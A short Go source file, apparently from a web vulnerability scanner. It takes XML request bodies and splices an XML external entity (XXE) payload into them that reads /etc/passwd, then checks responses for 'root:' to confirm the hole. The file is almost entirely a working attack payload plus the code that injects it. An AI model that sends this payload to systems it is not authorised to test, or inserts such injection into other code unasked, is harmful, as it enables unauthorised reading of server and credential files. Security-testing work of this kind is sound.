package xxe

import (
	"bytes"
	"io"
	"net/http"
)

const kVulnerability = `
<!DOCTYPE foo [
	<!ELEMENT foo ANY >
	<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
  <foo>&xxe;</foo>
`

func isXML(body []byte) bool {
	return bytes.HasPrefix(body, []byte("<?xml"))
}

func AddVulnerability(req *http.Request) error {
	body, err := io.ReadAll(req.Body)
	if err != nil {
		return err
	}

	if isXML(body) {
		idx := bytes.IndexByte(body, '>')
		body = bytes.Join([][]byte{body[:idx+1], []byte(kVulnerability), body[idx+1:]}, []byte{})
	}

	req.Body = io.NopCloser(bytes.NewReader(body))
	return nil
}

func IsVulnerable(body []byte) bool {
	return bytes.Contains(body, []byte("root:"))
}
